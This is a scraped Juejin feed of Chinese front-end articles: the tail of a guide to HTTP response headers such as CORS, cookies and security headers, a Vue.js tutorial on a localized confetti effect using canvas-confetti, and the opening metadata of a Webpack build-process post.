<li>注意：此时<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，必须指定具体源</li>
</ul>
</li>
</ul>
<ol start="5">
<li><code>Access-Control-Max-Age</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：指定预检请求（OPTIONS）的结果缓存时间（避免重复预检）</li>
<li>示例：<code>Access-Control-Max-Age: 86400</code>（缓存 1 天）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">（四）Cookie 与会话管理类：控制 “客户端状态存储”</h3>
<ol>
<li><code>Set-Cookie</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：服务器向客户端设置 Cookie（键值对、有效期、作用域等）</li>
<li>核心属性：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>name=value</code>：Cookie 的键值（如<code>sessionId=abc123</code>）</li>
<li><code>Expires=Wed, 20 Jun 2024 12:00:00 GMT</code>：过期时间（持久 Cookie）</li>
<li><code>Max-Age=86400</code>：有效期（秒，优先级高于 Expires）</li>
<li><code>Domain=example.com</code>：Cookie 生效的域名（子域名可继承）</li>
<li><code>Path=/admin</code>：Cookie 生效的路径（仅该路径下的请求会携带）</li>
<li><code>HttpOnly</code>：禁止 JavaScript 通过<code>document.cookie</code>访问（防 XSS 攻击）</li>
<li><code>Secure</code>：仅在 HTTPS 请求中携带 Cookie</li>
<li><code>SameSite=Strict/Lax</code>：限制跨站请求携带 Cookie（防 CSRF 攻击）</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>示例：<code>Set-Cookie: userId=123; Max-Age=3600; HttpOnly; Secure; SameSite=Lax</code></li>
<li>前端关联：登录状态维持、用户偏好存储的核心机制，需关注安全属性（如 HttpOnly）</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>Clear-Site-Data</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：服务器指示客户端清除指定类型的数据（如 Cookie、缓存、存储等）</li>
<li>示例：<code>Clear-Site-Data: "cookies", "storage"</code>（清除 Cookie 和本地存储）</li>
<li>应用场景：用户登出时强制清除敏感数据</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">（五）重定向类：告诉客户端 “请求需要跳转”</h3>
<ol>
<li><code>Location</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：配合 3xx 状态码（如 301、302）指定重定向的目标 URL</li>
<li>示例：<code>Location: https://www.new-example.com</code>（配合 301 状态码表示永久重定向）</li>
<li>前端关联：页面跳转、资源迁移后的路径修正，需注意 301（永久）与 302（临时）的区别</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">（六）安全增强类：提升 “请求 - 响应的安全性”</h3>
<ol>
<li><code>Content-Security-Policy</code>（CSP）</li>
</ol>
<ul>
<li>
<ul>
<li>作用：限制资源加载来源（如脚本、样式、图片等），防御 XSS 和注入攻击</li>
<li>示例：<code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com</code></li>
<li>说明：仅允许从自身域名和可信 CDN 加载脚本，其他来源的脚本会被拦截</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>X-Content-Type-Options</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：禁止浏览器对响应内容进行 “MIME 类型嗅探”（防止将非脚本文件当作脚本执行）</li>
<li>示例：<code>X-Content-Type-Options: nosniff</code></li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>X-Frame-Options</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：控制当前页面是否允许被嵌入到<code>iframe</code>中（防御点击劫持攻击）</li>
<li>取值：<code>DENY</code>（禁止任何页面嵌入）、<code>SAMEORIGIN</code>（仅允许同域页面嵌入）</li>
</ul>
</li>
</ul>
<ol start="4">
<li><code>Strict-Transport-Security</code>（HSTS）</li>
</ol>
<ul>
<li>
<ul>
<li>作用：强制客户端使用 HTTPS 访问（即使用户输入 HTTP URL）</li>
<li>示例：<code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>（有效期 1 年，包含子域名）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-9">（七）其他常用响应头：特殊场景补充</h3>
<ol>
<li><code>Server</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：标识服务器软件信息（如<code>Server: Nginx/1.21.0</code>）</li>
<li>注意：可隐藏具体版本以减少攻击面</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>Vary</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：告知缓存服务器 “根据指定请求头的不同值缓存不同版本的资源”</li>
<li>示例：<code>Vary: Accept-Encoding, Accept-Language</code>（根据压缩方式和语言缓存不同版本）</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>Retry-After</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：配合 503（服务不可用）状态码，告知客户端多久后重试请求</li>
<li>示例：<code>Retry-After: 3600</code>（1 小时后重试）</li>
</ul>
</li>
</ul>
<h2 data-id="heading-10">四、响应头与请求头的协同案例</h2>
<ol>
<li>缓存交互完整流程：</li>
</ol>
<ul>
<li>
<ul>
<li>请求：<code>If-None-Match: "abc123"</code> + <code>If-Modified-Since: ...</code></li>
<li>响应：若资源未变 → <code>304 Not Modified</code>（无响应体）；若已变 → <code>200 OK</code> + <code>ETag: "def456"</code> + 新资源</li>
</ul>
</li>
</ul>
<ol start="2">
<li>跨域请求完整交互：</li>
</ol>
<ul>
<li>
<ul>
<li>预检请求（OPTIONS）：客户端发送<code>Origin</code> + <code>Access-Control-Request-Method</code></li>
<li>预检响应：服务器返回<code>Access-Control-Allow-Origin</code> + <code>Access-Control-Allow-Methods</code></li>
<li>实际请求：客户端发送业务数据，服务器返回<code>Access-Control-Allow-Origin</code> + 业务响应</li>
</ul>
</li>
</ul>
<ol start="3">
<li>文件下载流程：</li>
</ol>
<ul>
<li>
<ul>
<li>请求：<code>GET /files/report.pdf</code></li>
<li>响应：<code>Content-Type: application/pdf</code> + <code>Content-Disposition: attachment; filename="report.pdf"</code></li>
</ul>
</li>
</ul>
<h2 data-id="heading-11">五、前端开发中的响应头实践与调试</h2>
<ol>
<li>如何查看响应头？</li>
</ol>
<ul>
<li>
<ul>
<li>浏览器开发者工具→Network 面板→选中请求→Headers→Response Headers</li>
</ul>
</li>
</ul>
<ol start="2">
<li>响应头相关的常见错误及排查：</li>
</ol>
<ul>
<li>
<ul>
<li>CORS 错误：检查<code>Access-Control-Allow-Origin</code>是否与请求<code>Origin</code>匹配</li>
<li>缓存不生效：检查<code>Cache-Control</code>是否正确设置（如是否误设<code>no-store</code>）</li>
<li>文件下载失败：确认<code>Content-Type</code>与文件类型一致，<code>Content-Disposition</code>是否包含<code>attachment</code></li>
</ul>
</li>
</ul>
<ol start="3">
<li>无法直接修改响应头（前端限制）：</li>
</ol>
<ul>
<li>
<ul>
<li>响应头由服务器控制，前端只能通过请求头间接影响（如<code>Accept-Encoding</code>影响<code>Content-Encoding</code>）</li>
<li>若需自定义响应头逻辑，需与后端协作配置</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue.js 中实现局部彩条ConfettiEffect动效：采用canvas-confetti库]]></title>    <link>https://juejin.cn/post/7575457788665298996</link>    <guid>https://juejin.cn/post/7575457788665298996</guid>    <pubDate>2025-11-24T07:02:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575457788665298996" data-draft-id="7575457788665102388" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue.js 中实现局部彩条ConfettiEffect动效：采用canvas-confetti库"/> <meta itemprop="keywords" content="Vue.js,Canvas"/> <meta itemprop="datePublished" content="2025-11-24T07:02:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱分享的鱼鱼"/> <meta itemprop="url" content="https://juejin.cn/user/3901536646733133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue.js 中实现局部彩条ConfettiEffect动效：采用canvas-confetti库
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3901536646733133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱分享的鱼鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:02:16.000Z" title="Mon Nov 24 2025 07:02:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98d3bf95a92245a08f67aa00a97b388b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5YiG5Lqr55qE6bG86bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572535&amp;x-signature=ogbCYxbUKYmS3vFWR7w1mKHFT7Y%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0"/>
<p>实现局部彩条ConfettiEffect动效，发个博客记录一下</p>
<h3 data-id="heading-1">技术实现方案</h3>
<h4 data-id="heading-2">1. 选择合适的动效库</h4>
<p>我们选择 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcatdad%2Fcanvas-confetti" target="_blank" title="https://github.com/catdad/canvas-confetti" ref="nofollow noopener noreferrer">canvas-confetti</a> 这个轻量级库，它专门用于创建纸屑效果，具有以下优势：</p>
<ul>
<li>体积小（约 4KB）</li>
<li>效果丰富且可定制</li>
<li>性能优秀</li>
<li>支持多种发射模式</li>
</ul>
<p>安装方式：</p>
<pre><code class="hljs language-bash" lang="bash">npm install canvas-confetti
</code></pre>
<h4 data-id="heading-3">2. 创建动效组件</h4>
<p>首先创建一个可复用的动效组件：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- ConfettiEffect.vue --&gt;
&lt;template&gt;
  &lt;div&gt;&lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import confetti from 'canvas-confetti';

export default {
  name: 'ConfettiEffect',
  methods: {
    trigger(duration = 3000, position = null) {
      // 如果提供了位置信息，则在该位置附近创建局部效果
      if (position) {
        confetti({
          particleCount: 50,        // 减少粒子数量
          spread: 45,               // 缩小扩散角度
          startVelocity: 20,        // 设置初始速度
          decay: 0.95,              // 设置衰减率
          gravity: 1.5,             // 调整重力
          scalar: 0.8,              // 缩放粒子大小
          ticks: 100,               // 减少动画持续时间
          origin: {
            x: position.x,          // 设置X轴起始位置
            y: position.y           // 设置Y轴起始位置
          }
        });
      } else {
        // 默认全屏效果
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 }
        });
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-4">3. 在触发点计算位置</h4>
<p>在需要触发动效的地方（如复选框点击事件）计算位置并触发效果：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="task-item"&gt;
    &lt;input
      type="checkbox"
      :checked="task.status === 'done'"
      @change="toggleTaskStatus(task, $event)"
    /&gt;
    &lt;!-- 其他任务内容 --&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  methods: {
    toggleTaskStatus(task, event) {
      // 业务逻辑处理...
      
      // 只在任务完成时触发动效
      if (task.status === 'done') {
        // 获取触发元素的位置
        const checkbox = event.target;
        const rect = checkbox.getBoundingClientRect();
        const position = {
          x: (rect.left + rect.width / 2) / window.innerWidth,
          y: (rect.top + rect.height / 2) / window.innerHeight
        };
        
        // 触发局部彩条效果
        this.$refs.confettiEffect.trigger(3000, position);
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-5">4. 在首页组件中集成应用</h4>
<p>在首页组件中集成彩条效果，主要应用于任务完成场景：</p>
<pre><code class="hljs language-js" lang="js">&lt;!-- dashboard.<span class="hljs-property">vue</span> --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dashboard"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 其他页面内容 --&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 今日任务清单 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tasks-section"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tasks-list"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">v-for</span>=<span class="hljs-string">"task in todayTasks"</span>
          <span class="hljs-attr">:key</span>=<span class="hljs-string">"task.taskId"</span>
          <span class="hljs-attr">class</span>=<span class="hljs-string">"task-item"</span>
          <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ completed: task.status === 'done' }"</span>
        &gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
            <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span>
            <span class="hljs-attr">:checked</span>=<span class="hljs-string">"task.status === 'done'"</span>
            @<span class="hljs-attr">change</span>=<span class="hljs-string">"toggleTaskStatus(task, $event)"</span>
          /&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"task-name"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ 'completed-task': task.status === 'done' }"</span>&gt;</span>
            {{ task.taskName }}
          <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"task-time"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"task.planTime"</span>&gt;</span>
            {{ formatTime(task.planTime) }}
          <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 添加彩条效果组件 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ConfettiEffect</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"confettiEffect"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ConfettiEffect</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ConfettiEffect.vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Dashboard'</span>,
  <span class="hljs-attr">components</span>: {
    <span class="hljs-title class_">ConfettiEffect</span>
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">toggleTaskStatus</span>(<span class="hljs-params">task, event</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> newStatus = task.<span class="hljs-property">status</span> === <span class="hljs-string">'done'</span> ? <span class="hljs-string">'todo'</span> : <span class="hljs-string">'done'</span>;
        <span class="hljs-keyword">await</span> tasksApi.<span class="hljs-title function_">updateTask</span>(task.<span class="hljs-property">taskId</span>, {
          <span class="hljs-attr">status</span>: newStatus
        });

        task.<span class="hljs-property">status</span> = newStatus;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todayFinishedTasks</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todayTasks</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">status</span> === <span class="hljs-string">'done'</span>);
        
        <span class="hljs-comment">// 只在任务完成时触发动效</span>
        <span class="hljs-keyword">if</span> (newStatus === <span class="hljs-string">'done'</span>) {
          <span class="hljs-comment">// 计算复选框位置并触发动效</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">triggerConfettiAtPosition</span>(event);
        }
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'更新任务状态失败:'</span>, error);
        <span class="hljs-title function_">alert</span>(<span class="hljs-string">'更新任务状态失败'</span>);
      }
    },
    
    <span class="hljs-title function_">triggerConfettiAtPosition</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-comment">// 获取触发元素的位置</span>
      <span class="hljs-keyword">const</span> checkbox = event.<span class="hljs-property">target</span>;
      <span class="hljs-keyword">const</span> rect = checkbox.<span class="hljs-title function_">getBoundingClientRect</span>();
      <span class="hljs-keyword">const</span> position = {
        <span class="hljs-attr">x</span>: (rect.<span class="hljs-property">left</span> + rect.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>) / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,
        <span class="hljs-attr">y</span>: (rect.<span class="hljs-property">top</span> + rect.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>) / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>
      };
      
      <span class="hljs-comment">// 触发局部彩条效果</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">confettiEffect</span>.<span class="hljs-title function_">trigger</span>(<span class="hljs-number">3000</span>, position);
    }
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>

</code></pre>
<h3 data-id="heading-6">关键优化点</h3>
<h4 data-id="heading-7">1. 参数调优</h4>
<p>实现局部化效果的关键在于参数调整：</p>
<ul>
<li><strong>particleCount</strong>: 从 150 减少到 50，避免过度渲染</li>
<li><strong>spread</strong>: 从 70 减少到 45，限制扩散范围</li>
<li><strong>ticks</strong>: 从 200 减少到 100，缩短动画时间</li>
<li><strong>origin</strong>: 使用计算得到的精确位置</li>
</ul>
<h4 data-id="heading-8">2. 位置计算</h4>
<p>通过 <code>getBoundingClientRect()</code> 获取元素相对于视窗的位置，然后转换为 canvas-confetti 所需的比例坐标：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> position = {
  <span class="hljs-attr">x</span>: (rect.<span class="hljs-property">left</span> + rect.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>) / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,
  <span class="hljs-attr">y</span>: (rect.<span class="hljs-property">top</span> + rect.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>) / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>
};
</code></pre>
<h4 data-id="heading-9">3. 条件触发</h4>
<p>只在特定状态转换时触发效果（如未完成 → 完成），避免在逆向操作时误触发：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (newStatus === <span class="hljs-string">'done'</span>) {
  <span class="hljs-comment">// 触发动效</span>
}
</code></pre>
<h3 data-id="heading-10">实际效果</h3>
<p>通过以上实现，我们可以获得以下效果：</p>
<ol>
<li><strong>精准反馈</strong>：彩条只在用户点击的复选框附近出现</li>
<li><strong>视觉舒适</strong>：不会遮挡其他界面元素</li>
<li><strong>性能良好</strong>：减少了粒子数量和动画时间</li>
<li><strong>体验流畅</strong>：用户能清晰感知到自己的操作结果</li>
</ol>
<h3 data-id="heading-11">总结</h3>
<p>局部化的动效设计是提升用户体验的重要细节。通过合理使用 canvas-confetti 库和精确的位置计算，我们能够在 Vue.js 项目中轻松实现这种效果。这种设计不仅让界面更加生动有趣，还能提供清晰的操作反馈，提升用户的操作信心和满意度。</p>
<p>在实际项目中，我们可以将这种局部动效应用到各种用户交互场景中，如按钮点击、表单提交、任务完成等，为用户提供更加精致和贴心的交互体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Webpack 构建流程全解：从源码到产物的“奇幻漂流”]]></title>    <link>https://juejin.cn/post/7575910298282344483</link>    <guid>https://juejin.cn/post/7575910298282344483</guid>    <pubDate>2025-11-24T07:12:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910298282344483" data-draft-id="7575457788664709172" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Webpack 构建流程全解：从源码到产物的“奇幻漂流”"/> <meta itemprop="keywords" content="前端,Webpack"/> <meta itemprop="datePublished" content="2025-11-24T07:12:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="少卿"/> <meta itemprop="url" content="https://juejin.cn/user/26044010879709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Webpack 构建流程全解：从源码到产物的“奇幻漂流”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/26044010879709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    少卿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:12:59.000Z" title="Mon Nov 24 2025 07:12:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
